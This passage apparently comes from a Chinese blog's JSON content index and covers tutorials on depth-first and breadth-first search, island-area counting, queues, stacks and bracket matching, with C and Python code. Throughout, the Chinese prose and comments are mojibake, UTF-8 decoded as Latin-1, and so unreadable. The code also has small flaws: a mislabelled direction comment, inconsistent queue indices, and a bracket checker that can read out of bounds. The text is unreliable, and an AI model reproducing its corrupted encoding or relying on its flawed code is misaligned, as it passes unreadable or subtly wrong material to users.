äº†æ·±åº¦ä¼˜å…ˆçš„æœç´¢æ–¹å¼\nè¿™é‡Œå°±ç®€å•çš„å®è·µä¸€ä¸‹\n**é¢˜ç›®ï¼š**ç”Ÿæˆä¸€ä¸ªè¿·å®«ï¼Œä¿è¯è¿·å®«æœ‰è§£ï¼Œè®¾ç«‹èµ·ç‚¹åæ ‡å’Œç›®æ ‡åæ ‡ï¼Œä¸€æ­¥èµ°ä¸€æ ¼ï¼Œæ±‚èµ·ç‚¹åˆ°ç›®æ ‡çš„_æœ€çŸ­è·¯å¾„_\nå…ˆæƒ³æƒ³å§ï¼Œç¦»ä¸å¼€åŸºæœ¬æ¨¡å‹\nç›´æ¥ä¸Šä»£ç ğŸ‘‡\n#include\u0026lt;stdio.h\u0026gt;\rint a[51][51];\rint mark[51][51];\rint n, m;//nä¸ºè¡Œï¼Œmä¸ºåˆ—\rint startx, starty, endx, endy;\rint min = 999999999;\rvoid func(int x, int y, int step)\r{\rint next[4][2] = { {0,1},//å‘å³\r{1,0},//å‘ä¸‹èµ°\r{0,-1},//å‘å·¦èµ°\r{-1,0}//å‘å³èµ°\r};\rint tx, ty, k;\rif (x == endx \u0026amp;\u0026amp; y == endy)\r{\rif (step \u0026lt; min)\r{\rmin = step;\r}\rreturn;\r}\rfor (int k = 0; k \u0026lt;=3; k++)//æ¨¡æ‹Ÿä¸Šä¸‹å·¦å³ å››ç§èµ°æ³•\r{\rtx = x + next[k][0];\rty = y + next[k][1];\r//è¿˜è¦åˆ¤æ–­æ˜¯å¦è¶Šç•Œ\rif (tx \u0026lt;1 || tx \u0026gt;n || ty \u0026lt;1 || ty \u0026gt; m)\rcontinue;//è¶Šç•Œå°±ä¸è€ƒè™‘è¿™ä¸€ç§èµ°æ³•äº†\rif (a[tx][ty] == 0 \u0026amp;\u0026amp; mark[tx][ty] == 0)//åˆ¤æ–­æ²¡èµ°è¿‡çš„ç©ºåœ°\r{\rmark[tx][ty] = 1;//æ ‡è®°ä¸ºèµ°è¿‡\rfunc(tx, ty, step + 1);\rmark[tx][ty] = 0;//è¿™ä¸¤æ­¥ä¼¼æ›¾ç›¸è¯†å§\r}\r}\rreturn;\r}\rint main()\r{\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;=n; i++)\r{\rfor (int j = 1; j \u0026lt;=m; j++)\r{\rint t;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;t);\ra[i][j] = t;\r}\r}//å½•å…¥è¿·å®«ï¼Œ0ä¸ºç©ºåœ°ï¼Œ1ä¸ºéšœç¢ç‰©\rscanf_s(\u0026#34;%d %d %d %d\u0026#34;, \u0026amp;startx, \u0026amp;starty, \u0026amp;endx, \u0026amp;endy);//å½•å…¥èµ·ç‚¹å’Œç»ˆç‚¹\rmark[startx][starty] = 1;\rfunc(startx, starty, 0);\rprintf(\u0026#34;%d\u0026#34;, min);\rreturn 0;\r} å°ç»“ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ä»¥æ·±åº¦ä¸ºä¼˜å…ˆçš„åŸåˆ™è¿›è¡Œéå†ï¼Œå› æ­¤ä¼šå°½å¯èƒ½æ·±å…¥åˆ°å›¾çš„æŸä¸€åˆ†æ”¯ï¼Œç›´åˆ°æ— è·¯å¯èµ°æ‰å›é€€ã€‚è¿™ä½¿å¾—æ·±åº¦ä¼˜å…ˆæœç´¢åœ¨å¯»æ‰¾è·¯å¾„ã€åˆ¤æ–­è¿é€šæ€§ã€æ‰¾è¿é€šåˆ†é‡ç­‰é—®é¢˜ä¸Šå…·æœ‰å¹¿æ³›åº”ç”¨ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ·±åº¦ä¼˜å…ˆæœç´¢å¯èƒ½é™·å…¥æ— é™å¾ªç¯ï¼Œå› æ­¤åœ¨å®ç°æ—¶éœ€è¦è€ƒè™‘é¿å…é‡å¤è®¿é—®èŠ‚ç‚¹çš„æƒ…å†µï¼Œä¾‹å¦‚é€šè¿‡ä½¿ç”¨ä¸€ä¸ªæ ‡è®°æ•°ç»„æ¥è®°å½•èŠ‚ç‚¹çš„è®¿é—®çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„markæ•°ç»„èµ·åˆ°çš„ä½œç”¨ã€‚\nå¹¿åº¦ä¼˜å…ˆæœç´¢ #\rè¿˜æ˜¯æ¥ç€ç”¨è¿·å®«è¿™ä¸ªæ¨¡å‹æ¥å­¦ä¹ \næ·±åº¦ä¼˜å…ˆæœç´¢å¦‚å…¶åï¼Œä¸€æ¡è·¯èµ°åˆ°å°½å¤´æ‰å›æ¥\né‚£ä¹ˆå¹¿åº¦ä¼˜å…ˆçš„è¯ï¼Œè‚¯å®šå°±ä¸ä¼šä¸€æ¡è·¯èµ°åˆ°â€œæ­»â€å•¦\né‡åˆ°é€‰æ‹©æ—¶ï¼Œä¼šå°è¯•æ¯ä¸€ç§å†³ç­–\nå¯ä»¥æƒ³è±¡ä¸ºï¼ŒåŸåœ°è½¬ä¸€åœˆçœ‹å“ªé‡Œå¯ä»¥èµ°ï¼ˆå†™å…¥è®¡åˆ’é‡Œï¼‰ï¼ŒæŒ‰ç…§è®¡åˆ’é¡ºåºå¾€å¤–èµ°ä¸€æ­¥ï¼Œå†è½¬ä¸€åœˆåè®°ä¸‹è¿™æ—¶å‘¨å›´çš„æƒ…å†µï¼ˆæ”¾åˆ°åé¢çš„è®¡åˆ’é‡Œï¼‰ï¼Œç„¶åé€€åˆ°ä¸Šä¸€æ­¥ï¼Œçœ‹ä¸Šä¸€æ­¥çš„è®¡åˆ’æ˜¯å¦èµ°å®Œï¼Œå¦‚æœæ²¡èµ°å®Œå°±ç»§ç»­ä¸Šä¸€æ­¥å‰©ä½™çš„è®¡åˆ’ï¼Œé‡è¦çš„æ˜¯ï¼Œæ¯èµ°åˆ°ä¸€æ–°ä½ç½®ï¼Œéƒ½è¦åŸåœ°è½¬ä¸€åœˆï¼Œå°†èƒ½èµ°çš„å†™å…¥è®¡åˆ’ï¼Œæ‰§è¡Œè®¡åˆ’è¦æŒ‰ç…§å…ˆåé¡ºåºè¿›è¡Œ\nä¸¾ä¸ªä¾‹å­ï¼ˆå…ˆä¸ç®¡åæ ‡çš„é—®é¢˜ï¼Œåªæ˜¯ç†è§£æ¦‚å¿µï¼‰ï¼Œæˆ‘åœ¨èµ·ç‚¹å…ˆè½¬ä¸€åœˆï¼Œå‘ç°èƒ½èµ° å³è¾¹ å’Œ ä¸‹è¾¹ï¼Œé‚£ä¹ˆæˆ‘å°±åœ¨è®¡åˆ’é‡Œå†™ä¸Š right1ï¼Œdown1ï¼Œä¹‹åæ‰§è¡Œè®¡åˆ’å‘å³èµ°ä¸€æ­¥ï¼Œå‘ç°èƒ½èµ°çš„åªæœ‰ä¸‹è¾¹ï¼Œä¾¿åœ¨è®¡åˆ’åè¾¹åŠ ä¸Š down2 ï¼Œé‚£ä¹ˆç°åœ¨è®¡åˆ’å°±æˆäº† ã€right1ï¼Œdown1ï¼Œdown2 ã€‘ï¼Œç¬¬ä¸€ä¸ªè®¡åˆ’å°±è¿™æ ·å®Œæˆï¼Œå› ä¸ºæˆ‘ä»¬è¦ä¼˜å…ˆå°è¯•ä¸€ä¸ªç‚¹çš„æ‰€æœ‰æ–¹å¼ï¼Œæ‰€ä»¥è¿™æ—¶å€™è¦é€€å›åˆ°åˆšåˆšé‚£ä¸ªç‚¹ï¼Œå»å®Œæˆåˆšé‚£ä¸ªç‚¹çš„å‰©ä½™è®¡åˆ’ï¼Œäºæ˜¯è¿›è¡Œdown1è®¡åˆ’\nç½‘ä¸Šæ‰¾äº†ä¸¤å¼ å›¾ï¼Œå¯ä»¥è¯•ç€ç†è§£ğŸ‘‡\nå¦‚æœæˆ‘è¿™é‡Œè®²çš„ä¸æ¸…æ¥šçš„è¯ï¼Œé‚£å°±æ¥çœ‹çœ‹ä»£ç çš„æ€è·¯å­\nå¹¿åº¦ä¼˜å…ˆè‚¯å®šå’Œæ·±åº¦ä¼˜å…ˆæ˜¯ä¸ä¸€æ ·çš„å“¦\nç”±äºå¹¿åº¦ä¼˜å…ˆè¿½æ±‚çš„æ˜¯ä¸€ä¸ªå¹¿åº¦ï¼Œé‚£ä¹ˆé€’å½’æ€æƒ³å¸¦æ¥çš„â€œä¸€å†²åˆ°åº•â€è‚¯å®šå°±ä¸èƒ½ä½¿ç”¨äº†\nä¸è¿‡åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ï¼Œå­¦ä¹ äº†é˜Ÿåˆ—çš„ç›¸å…³çŸ¥è¯†\nçœ‹çœ‹ä¸Šé¢æˆ‘æ‰€è¯´çš„ã€Šè®¡åˆ’ã€‹è¿™ä¸ªè¯ï¼Œæ˜¯å¦èƒ½å’Œé˜Ÿåˆ—è”ç³»èµ·æ¥å‘¢ï¼Ÿ\nä¸Šä»£ç ğŸ‘‡ï¼š\n#include\u0026lt;stdio.h\u0026gt;\tstruct note //ç»“æ„ä½“å®ç°é˜Ÿåˆ—\r{\rint x;\rint y;\rint s;\r};\rstruct note queue[2501];\rint head=1, tail=1;\rint map[51][51];\rint mark[51][51];//ç”¨äºæ ‡è®°å“ªäº›è·¯æ˜¯èµ°è¿‡çš„\rint step = 0;\rint main()\r{\rint next[4][2] = {\r{0,1},\r{1,0},\r{0,-1},\r{-1,0}\r};//æ–¹å‘æ•°ç»„\rint n, m,flag=0;\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);//å½•å…¥è¡Œã€åˆ—\rfor(int i=1;i\u0026lt;=n;i++)\r{\rfor (int j = 1; j \u0026lt;= m; j++)\r{\rint t;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;t);\rmap[i][j] = t;\r}\r}//å½•å…¥åœ°å›¾\rint startx, starty, endx, endy;\rscanf_s(\u0026#34;%d %d %d %d\u0026#34;, \u0026amp;startx, \u0026amp;starty, \u0026amp;endx, \u0026amp;endy);\rmark[startx][starty] = 1;//å…ˆæ ‡è®°èµ·ç‚¹åæ ‡\rqueue[tail].x = startx;\rqueue[tail].y = starty;\rqueue[tail].s = 0;\rtail++;\rwhile (head \u0026lt; tail)\r{\rfor (int i = 0; i \u0026lt; 4; i++)//å°è¯•å››ä¸ªæ–¹å‘\r{\rint tx = queue[head].x + next[i][0];\rint ty = queue[head].y + next[i][1];\rif (tx\u0026lt;1 || tx\u0026gt;n || ty\u0026lt;1 || ty\u0026gt;m)//åˆ¤æ–­æ˜¯å¦è¶Šç•Œ\rcontinue;\r//å¦‚æœä¸è¶Šç•Œå°±åŠ é•¿é˜Ÿåˆ—\rif (map[tx][ty] == 0 \u0026amp;\u0026amp; mark[tx][ty] == 0)//æ²¡æœ‰éšœç¢ç‰©ï¼Œä¹Ÿæ²¡æœ‰èµ°è¿‡çš„æ ¼å­\r{\rmark[tx][ty] = 1;\rqueue[tail].x = tx;\rqueue[tail].y = ty;\rqueue[tail].s = queue[head].s + 1;\rtail++;\r}\rif (tx == endx \u0026amp;\u0026amp; ty == endy)\r{\rflag = 1;//åªæ˜¯ä¸€ä¸ªæ ‡å¿—å˜é‡ï¼Œå‡å°‘ä¸å¿…è¦çš„å¾ªç¯\rbreak;\r}\r}\rif (flag == 1)\rbreak;//è¯´æ˜å·²ç»æ‰¾åˆ°äº†\rhead++;//æ²¡æœ‰æ‰¾åˆ°çš„è¯å°±åç§»headï¼Œç»§ç»­é‡å¤è¿™ä¸ªè¿‡ç¨‹\r}\rprintf(\u0026#34;%d\u0026#34;, queue[tail - 1].s);\rreturn 0;\r} å¦‚æœé˜Ÿåˆ—èƒ½å¤Ÿçœ‹æ‡‚çš„è¯ï¼Œé‚£è¿™æ®µä»£ç åº”è¯¥æ²¡ä»€ä¹ˆéš¾åº¦ï¼Œåªæ˜¯åˆæƒ³å¯èƒ½æƒ³ä¸åˆ°ç”¨é˜Ÿåˆ—æ¥è§£å†³\n**å°ç»“ï¼š**å¹¿åº¦ä¼˜å…ˆæœç´¢ä»èµ·å§‹èŠ‚ç‚¹å¼€å§‹ï¼Œé€å±‚å‘å¤–æ‰©å±•ï¼Œå…ˆéå†è·ç¦»èµ·å§‹èŠ‚ç‚¹è¾ƒè¿‘çš„èŠ‚ç‚¹ï¼Œç„¶åå†è®¿é—®ç¦»èµ·å§‹èŠ‚ç‚¹æ›´è¿œçš„èŠ‚ç‚¹ã€‚\n**ä¸æ·±åº¦ä¼˜å…ˆçš„ä¸åŒç‚¹ï¼š**å¹¿åº¦ä¼˜å…ˆæœç´¢éå†è¿‡ç¨‹ä¸­ä¸ä¼šé™·å…¥æ— é™å¾ªç¯ï¼Œå› ä¸ºæ¯ä¸ªèŠ‚ç‚¹åªè¢«è®¿é—®ä¸€æ¬¡ï¼Œå¹¶ä¸”æŒ‰ç…§è·ç¦»èµ·å§‹èŠ‚ç‚¹çš„è¿œè¿‘é¡ºåºè¿›è¡Œè®¿é—®ã€‚\næµ·å²›é¢ç§¯ #\r**é¢˜ç›®ï¼š**æµ·å²›é¢ç§¯\nç®€è¨€ä¹‹ï¼Œç»™ä¸€ä¸ªåœ°å›¾å½•å…¥æµ·æ‹”ï¼Œ0æ˜¯æµ·æ‹”ä¸º0ï¼ˆå°±æ˜¯æµ·æ´‹çš„æ„æ€ï¼‰ï¼Œå¤§äº 0 å°±æ˜¯ç›¸å¯¹åº”çš„æµ·æ‹”\nç»™å‡ºä¸€ä¸ªæµ·å²›ä¸Šçš„åæ ‡ï¼Œæ±‚è¿™ä¸ªæµ·å²›çš„é¢ç§¯\nç»“åˆä¸Šé¢çš„å¹¿åº¦ä¼˜å…ˆæœç´¢æ–¹å¼ï¼Œåšè¿™é“é¢˜å°±ä¼šååˆ†ç®€å•äº†\nä¸Šä»£ç ğŸ‘‡ï¼š\n#include\u0026lt;stdio.h\u0026gt;\tstruct note {\rint x;\rint y;\r};\rstruct note queue[2501];\rint head=1, tail=1;\rint map[51][51];\rint mark[51][51];//ç”¨äºæ ‡è®°å“ªäº›è·¯æ˜¯èµ°è¿‡çš„\rint step = 0;\rint max = 1;\rint main()\r{\rint next[4][2] = {\r{0,1},\r{1,0},\r{0,-1},\r{-1,0}\r};//æ–¹å‘æ•°ç»„\rint n, m,flag=0;\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);//å½•å…¥è¡Œã€åˆ—\rfor(int i=1;i\u0026lt;=n;i++)\r{\rfor (int j = 1; j \u0026lt;= m; j++)\r{\rint t;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;t);\rmap[i][j] = t;\r}\r}//å½•å…¥åœ°å›¾\rint startx, starty;\rprintf(\u0026#34;è¯·è¾“å…¥åæ ‡ï¼š\\n\u0026#34;);\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;startx, \u0026amp;starty);\rmark[startx][starty] = 1;//å…ˆæ ‡è®°èµ·ç‚¹åæ ‡\rqueue[tail].x = startx;\rqueue[tail].y = starty;\rtail++;\rwhile (head \u0026lt; tail)\r{\rfor (int i = 0; i \u0026lt; 4; i++)//å°è¯•å››ä¸ªæ–¹å‘\r{\rint tx = queue[head].x + next[i][0];\rint ty = queue[head].y + next[i][1];\rif (tx\u0026lt;1 || tx\u0026gt;n || ty\u0026lt;1 || ty\u0026gt;m)//åˆ¤æ–­æ˜¯å¦è¶Šç•Œ\rcontinue;\r//å¦‚æœä¸è¶Šç•Œå°±åŠ é•¿é˜Ÿåˆ—\rif (map[tx][ty] != 0 \u0026amp;\u0026amp; mark[tx][ty] == 0)//ä¸èƒ½æ˜¯æµ·æ´‹ï¼Œè€Œä¸”æ²¡èµ°è¿‡çš„\r{\rqueue[tail].x = tx;\rqueue[tail].y = ty;\tmark[tx][ty] = 1;//æ ‡è®°è¿™ä¸ªç‚¹\rtail++;\rmax++;\r}\r}\rhead++;//æ²¡æœ‰æ‰¾åˆ°çš„è¯å°±åç§»headï¼Œç»§ç»­é‡å¤è¿™ä¸ªè¿‡ç¨‹\r}\rprintf(\u0026#34;\\nè¯¥ç‚¹é¢ç§¯ä¸º:%d\\n\u0026#34;, max);\rreturn 0;\r} å¯ä»¥çœ‹å‡ºåŸºæœ¬çš„æ¨¡å‹å§\nç¨‹åºçš„æ‰§è¡Œç»“æœğŸ‘‡\nå½“ç„¶ï¼Œåˆ©ç”¨æ·±åº¦ä¼˜å…ˆä¹Ÿå¯ä»¥åšå‡ºè¿™é“é¢˜\nè¿™é‡Œå°±ä¸å†™ä»£ç äº†ï¼Œæœ‰å…´è¶£è‡ªå·±è¯•è¯•å§ï¼ˆå›°ğŸ˜©\n","date":"2023-07-12","externalUrl":null,"permalink":"/posts/2023/07/depth-first-search-dfs-and-breadth-first-search-bfs/","section":"Posts","summary":"","title":"æ·±åº¦ä¸å¹¿åº¦æœç´¢","type":"posts"},{"content":"\ré˜Ÿåˆ— #\ré˜Ÿåˆ—çš„æ¦‚å¿µï¼šåªå…è®¸åœ¨ä¸€ç«¯è¿›è¡Œæ’å…¥æ•°æ®æ“ä½œï¼Œåœ¨å¦ä¸€ç«¯è¿›è¡Œåˆ é™¤æ•°æ®æ“ä½œçš„ç‰¹æ®Šçº¿æ€§è¡¨\né˜Ÿåˆ—çš„ä¸¤ç«¯ï¼š\né˜Ÿå°¾ï¼šè¿›è¡Œæ’å…¥æ“ä½œçš„ä¸€ç«¯ç§°ä¸ºé˜Ÿå°¾\né˜Ÿå¤´ï¼šè¿›è¡Œåˆ é™¤æ“ä½œçš„ä¸€ç«¯ç§°ä¸ºé˜Ÿå¤´\nå…ˆä¸¾ä¸€ä¸ªä¾‹å­ï¼š\nç»™å‡ºä¸€æ®µåºåˆ—ï¼š 6 3 1 7 5 8 9 2 4\nå¯¹è¿™æ®µåºåˆ—è¿›è¡Œä»¥ä¸‹æ“ä½œï¼šåˆ é™¤ç¬¬ä¸€ä¸ªæ•°å­—ï¼Œå°†ç¬¬äºŒä¸ªæ•°å­—ç§»åˆ°æœ«å°¾ï¼Œåˆ é™¤ç¬¬ä¸‰ä¸ªæ•°å­—ï¼Œå°†ç¬¬å››ä¸ªæ•°å­—ç§»åˆ°æœ«å°¾â€¦â€¦ä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°å‰©ä¸‹æœ€åä¸€ä¸ªæ•°å­—ï¼Œå¹¶ä¸”å°†å…¶åˆ é™¤ï¼Œæœ€åæŒ‰ç…§åˆ é™¤çš„é¡ºåºå°†è¢«è¢«åˆ é™¤çš„æ•°å­—è¿æˆä¸€æ®µæ–°åºåˆ—ï¼Œæ±‚è¿™æ®µåºåˆ—ï¼Ÿ\né‚£ä¹ˆè¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ•°ç»„è‚¯å®šæ˜¯ç¦»ä¸å¼€çš„\nå’Œé˜Ÿåˆ—çš„æ¦‚å¿µè”ç³»èµ·æ¥ï¼Œä¸€ç«¯è¦æ’å…¥ï¼Œä¸€ç«¯è¦åˆ é™¤ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°ç»„å°±è¦å¼€å¤§ä¸€ç‚¹\nint a[101]={6,3,1,7,5,8,9,2,4}; å¹¶ä¸”æˆ‘ä»¬éœ€è¦ä¸¤ä¸ªå˜é‡æ¥è®°å½•é˜Ÿé¦–å’Œé˜Ÿå°¾ï¼ˆå¯ä»¥ç†è§£ä¸ºæŒ‡é’ˆå§\nhead=0;\rtail=10; åºåˆ—ä¸­åªæœ‰ä¹ä¸ªæ•°å­—ï¼Œä½†æ˜¯tailè®¾ç½®æˆ 9 æ˜¯ä¸ºäº†èŠ‚çº¦æ—¶é—´\né‚£ä¹ˆé˜Ÿåˆ—çš„æ“ä½œå…·ä½“å¦‚ä½•è¿›è¡Œçš„å‘¢ï¼Ÿ\nå°±è¿™é“é¢˜è€Œè¨€ï¼Œå…ˆå°†ç¬¬ä¸€ä¸ªé˜Ÿé¦–è¾“å‡ºé˜Ÿï¼Œheadåç§»æŒ‡å‘æ–°çš„é˜Ÿé¦–ï¼Œç¬¬äºŒä¸ªé˜Ÿé¦–ä¼šè¢«ç§»åˆ°æœ«ç«¯ï¼Œå¹¶ä¸”headå’Œtailéƒ½åŒæ—¶åç§»\nåŸºæœ¬çš„ä»£ç æ€è·¯å¦‚ä¸‹ï¼š\n#include\u0026lt;stdio.h\u0026gt;\tint main()\r{\rint a[101] = { 6,3,1,7,5,8,9,2,4 };\rint head = 0;\rint tail = 9;\rwhile (head \u0026lt; tail)\r{\rprintf(\u0026#34;%d \u0026#34;, a[head]);\rhead++;\ra[tail] = a[head];\rtail++;\rhead++;\r}\rreturn 0;\r} å½“ç„¶ä»£ç ä¹Ÿå¯ä»¥æ”¹è¿›ä¸ºç”¨ç»“æ„ä½“\nå°±åƒè¿™ç§æ–¹å¼ç¨å¾®åŒ…è£…ä¸€ä¸‹ï¼š\nstruct queue\r{\rint data[1000];\rint head;\rint tail; } æ ˆ #\ræ ˆå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªåªæœ‰ä¸€ç«¯å¼€å£çš„ç«–ç›´ä¹’ä¹“çƒç­’ï¼Œæƒ³è¦æ‹¿åˆ°æœ€ä¸‹é¢çš„çƒï¼Œä½ å…ˆæŠŠä¸Šé¢çš„çƒä¸€ä¸ªä¸ªæ‹¿å‡ºæ¥\næ¢è€Œè¨€ä¹‹ï¼Œæ ˆçš„ç‰¹ç‚¹å°±æ˜¯ï¼šå…ˆè¿›åå‡ºï¼Œæœ€å…ˆæ”¾è¿›å»çš„çƒè¦æœ€åæ‰èƒ½æ‹¿å‡ºæ¥\nåŒæ ·ä¸¾ä¸ªä¾‹å­ï¼š\nè¦åˆ¤æ–­ä¸€æ®µå­—ç¬¦ä¸²æ˜¯å¦å›æ–‡ï¼Œåº”è¯¥æ€æ ·è®¾è®¡ï¼Ÿ\nâ€œabcbaâ€ æ˜¯å›æ–‡ï¼Œ\u0026ldquo;abba\u0026rdquo; æ˜¯å›æ–‡ï¼Œ\u0026ldquo;abca\u0026rdquo; å°±ä¸æ˜¯å›æ–‡ é‚£ä¹ˆå¸¸è§çš„æ€è·¯å°±æ˜¯åˆ›å»ºä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œå¹¶ä»ä¸¤è¾¹å‘ä¸­é—´é è¿‘æ¯”è¾ƒ\nåŸºæœ¬æ€è·¯ï¼š\n#include\u0026lt;stdio.h\u0026gt;\t#include\u0026lt;string.h\u0026gt;\tint main()\r{\rchar s[100];\rscanf_s(\u0026#34;%s\u0026#34;, s, 100);\rint len = strlen(s);\rint mid = len / 2;\rfor (int i = 0; i \u0026lt; len; i++)\r{\rif (s[i] != s[len - i - 1])\r{\rprintf(\u0026#34;No\u0026#34;);\rreturn 0;\r}\r}\rprintf(\u0026#34;Yes\u0026#34;);\rreturn 0;\r} å½“ç„¶ï¼Œè¿™æ®µä»£ç æ²¡æœ‰æ¶‰åŠåˆ°æ ˆçš„åˆ©ç”¨ï¼Œåªæ˜¯ç®€å•çš„é¦–å°¾å‘ä¸­é—´é æ‹¢æ¯”è¾ƒå­—ç¬¦è€Œå·²\nå‡å¦‚æˆ‘ä»¬è¦åˆ©ç”¨æ ˆçš„æ€æƒ³å»è§£å†³è¿™é“é¢˜çš„è¯\nä»£ç å¾—è¿™æ ·å†™ğŸ‘‡\n#include\u0026lt;stdio.h\u0026gt;\t#include\u0026lt;string.h\u0026gt;\tint main()\r{\rchar a[101], s[101];\rscanf_s(\u0026#34;%s\u0026#34;, a, 101);\rint len = strlen(a);\rint mid = len / 2 ;\rint top = 0;\rint next=mid;\rfor (int i = 0; i \u0026lt; mid; i++)\r{\rs[++top] = a[i];\r}//å°†å‰é¢ä¸€åŠçš„å­—ç¬¦ä¸²æ”¾å…¥æ ˆä¸­\rif (len % 2 != 0)\rnext = mid + 1;//å¥‡å¶å¯¹å¦å¤–ä¸€æ®µçš„èµ·å§‹ä¸‹æ ‡æœ‰å½±å“çš„\rfor (int i = next; i \u0026lt; len; i++)\r{\rif (a[i] != s[top])\rbreak;\rtop--;\r}\rif (top == 0)\rprintf(\u0026#34;Yes\u0026#34;);\relse\rprintf(\u0026#34;No\u0026#34;);\rreturn 0;\r} è¿™ä¸ªä¾‹å­æ¯”è¾ƒç®€å•\né‚£ä¹ˆæ¥çœ‹çœ‹æ´›è°·ä¸Šçš„é¢˜å§\næœ‰æ•ˆçš„æ‹¬å· #\ré¢˜ç›®ï¼šæœ‰æ•ˆçš„æ‹¬å·\nç»™å®šä¸€ä¸ªåªåŒ…æ‹¬Â '('ï¼Œ')'ï¼Œ'{'ï¼Œ'}'ï¼Œ'['ï¼Œ']'Â çš„å­—ç¬¦ä¸²Â sÂ ï¼Œåˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦æœ‰æ•ˆã€‚\nå·¦æ‹¬å·å¿…é¡»ç”¨ç›¸åŒç±»å‹çš„å³æ‹¬å·é—­åˆã€‚\nå·¦æ‹¬å·å¿…é¡»ä»¥æ­£ç¡®çš„é¡ºåºé—­åˆã€‚\næ¯ä¸ªå³æ‹¬å·éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ç›¸åŒç±»å‹çš„å·¦æ‹¬å·ã€‚\n1 \u0026lt;= s.length \u0026lt;= 104\nç¤ºä¾‹ï¼š\n\u0026ldquo;( [ { } ( ) ] )\u0026rdquo; æ˜¯èƒ½åŒ¹é…æˆåŠŸçš„ï¼Œè€Œâ€œ( [ ) ]â€æ˜¯ä¸èƒ½åŒ¹é…æˆåŠŸçš„\nå…ˆæ‹ä¸€ä¸‹æ€è·¯\nç»“åˆæ¡ä»¶çš„ç¬¬äºŒç‚¹å’Œç¤ºä¾‹å¯ä»¥çœ‹å‡ºï¼Œæ‹¬å·çš„é—­åˆæ˜¯å°±è¿‘åŸåˆ™çš„ï¼Œæ„æ€æ˜¯å·¦æ‹¬å·ä¼šå’Œæœ€è¿‘çš„å³æ‹¬å·è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœç±»å‹ä¸åŒåˆ™å­—ç¬¦ä¸²ä¸ºæ— æ•ˆ\né‚£ä¹ˆæ ¹æ®è¿™ä¸ªæ€è·¯å¯ä»¥å†™å‡ºè¿™æ ·çš„ä»£ç ğŸ‘‡ï¼š\n#include\u0026lt;stdio.h\u0026gt;\t#include\u0026lt;string.h\u0026gt;\tchar s[10001];\rchar a[10002];\rchar pairs(char c);//è¿”å›å¯¹åº”æ‹¬å·çš„å‡½æ•°\rint main()\r{\rscanf_s(\u0026#34;%s\u0026#34;, s, 10001);\rint len = strlen(s);\rint top = 0;\rif (len % 2 == 1)\r{\rprintf(\u0026#34;No\u0026#34;);\rreturn 0;\r}//æ‹¬å·éƒ½æ˜¯ä¸€å¯¹ä¸€å¯¹çš„ï¼Œé•¿åº¦è‚¯å®šæ˜¯å¶æ•°\rfor (int i = 0; i \u0026lt; len; i++)\r{\rif (s[i] == \u0026#39;(\u0026#39; || s[i] == \u0026#39;[\u0026#39; || s[i] == \u0026#39;{\u0026#39;)\r{\ra[top] = s[i];//å°†å·¦æ‹¬å·æ”¾å…¥æ ˆé¡¶\rtop++;\r}\relse if(s[i] == \u0026#39;)\u0026#39; || s[i] == \u0026#39;]\u0026#39; || s[i] == \u0026#39;}\u0026#39;)//å³æ‹¬å·çš„æƒ…å†µ\r{\rchar c = pairs(s[i]);\rif (a[top-1] == c)\r{\rtop--;//å°±è¿‘åŒ¹é…ï¼Œå¦‚æœæˆåŠŸå°±é€€æ ˆ\r}\r}\relse//æœ‰éæ‹¬å·å­—ç¬¦\r{\rprintf(\u0026#34;è¾“å…¥æœ‰è¯¯\u0026#34;);\rreturn 0;\r}\r}\rif (top == 0)//æŸ¥çœ‹æ ˆæ˜¯å¦å…¨éƒ¨é€€å‡ºï¼Œå³æ˜¯å¦æœ‰æ‹¬å·å‰©ä½™æ²¡æœ‰åŒ¹é…çš„\r{\rprintf(\u0026#34;Yes\u0026#34;);\r}\relse\r{\rprintf(\u0026#34;No\u0026#34;);\r}\r}\rchar pairs(char c)\r{\rif (c == \u0026#39;)\u0026#39;)\rreturn \u0026#39;(\u0026#39;;\rif (c == \u0026#39;]\u0026#39;)\rreturn \u0026#39;[\u0026#39;;\rif (c == \u0026#39;}\u0026#39;)\rreturn \u0026#39;{\u0026#39;;\rreturn 0;\r} é™¤äº†æ ˆæ€æƒ³ï¼Œè¿™é“é¢˜è¿˜æœ‰å¦å¤–ä¸€ä¸ªæ€è·¯\nå¯ä»¥å°è¯•ä½¿ç”¨å­—ç¬¦ä¸²æ›¿æ¢çš„æ–¹å¼\nPythonå’ŒPHPéƒ½æœ‰å¯¹åº”çš„replaceå‡½æ•°\nè¿™é‡Œç”¨pythonæ¥å†™ä¸€äº›å¦å¤–çš„æ€è·¯ï¼Œä¹Ÿç®—æ˜¯æŠ•æœºå–å·§ç½¢\ndef check(s):\rwhile \u0026#39;()\u0026#39; in s or \u0026#39;[]\u0026#39; in s or \u0026#39;{}\u0026#39; in s :\rs=s.replace(\u0026#39;()\u0026#39;,\u0026#39;\u0026#39;)\rs=s.replace(\u0026#39;[]\u0026#39;,\u0026#39;\u0026#39;)\rs=s.replace(\u0026#39;{}\u0026#39;,\u0026#39;\u0026#39;)\rreturn s==\u0026#39;\u0026#39;\rif __name__==\u0026#34;__main__\u0026#34;:\rs=input()\rprint(check(s)) çº¸ç‰Œæ¸¸æˆ #\rè¿™é‡Œå°±ç®€å•çš„æè¿°ä¸€ä¸‹æ¸¸æˆè§„åˆ™\nä¸¤ä¸ªäººåˆ†åˆ«ä¸º A å’Œ B\nä¸¤äººæ‰‹é‡Œåˆ†åˆ«æœ‰ 6 å¼ 